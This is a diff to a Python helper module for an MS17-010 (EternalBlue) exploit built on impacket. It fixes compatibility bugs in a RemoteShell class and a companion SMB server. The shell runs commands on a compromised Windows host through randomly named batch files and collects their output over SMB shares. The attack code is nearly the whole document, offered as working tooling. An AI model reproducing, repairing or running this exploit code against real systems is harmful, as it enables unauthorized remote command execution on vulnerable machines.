@@ -1,15 +1,21 @@
 # impacket SMB extension for MS17-010 exploit.
 # this file contains only valid SMB packet format operation.
-from impacket import smb, smbconnection
+from impacket import smb, smbconnection, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from struct import pack
 from threading import Thread
 import os
 import cmd
+try:
+    import ConfigParser
+except ImportError:
+    import configparser as ConfigParser
 import string
 import random
 import logging
 
+SMBSERVER_DIR   = '__tmp'
+DUMMY_SHARE     = 'TMP'
 
 def getNTStatus(self):
     return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
@@ -411,7 +417,7 @@ class RemoteShell(cmd.Cmd):
         self.__share = share
         self.__mode = mode
         self.__outputFilename = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
-        self.__output = '\\\\127.0.0.1\\{}\\{}'.format(self.__share,self.__outputFilename)
+        self.__output = '\\\\%COMPUTERNAME%\\{}\\{}'.format(self.__share,self.__outputFilename)
         self.__batchFile = '%TEMP%\\{}.bat'.format(''.join([random.choice(string.ascii_letters) for _ in range(4)]))
         self.__outputBuffer = b''
         self.__command = ''
@@ -493,7 +499,7 @@ class RemoteShell(cmd.Cmd):
             self.transferClient.deleteFile(self.__share, self.__outputFilename)
         else:
             fd = open(SMBSERVER_DIR + '/' + self.__outputFilename,'r')
-            output_callback(fd.read())
+            output_callback(fd.read().encode('utf-8'))
             fd.close()
             os.unlink(SMBSERVER_DIR + '/' + self.__outputFilename)
 
@@ -557,7 +563,7 @@ class SMBServer(Thread):
         smbConfig.set('IPC$','comment','')
         smbConfig.set('IPC$','read only','yes')
         smbConfig.set('IPC$','share type','3')
-        smbConfig.set('IPC$','path')
+        smbConfig.set('IPC$','path','')
 
         self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
         logging.info('Creating tmp directory')
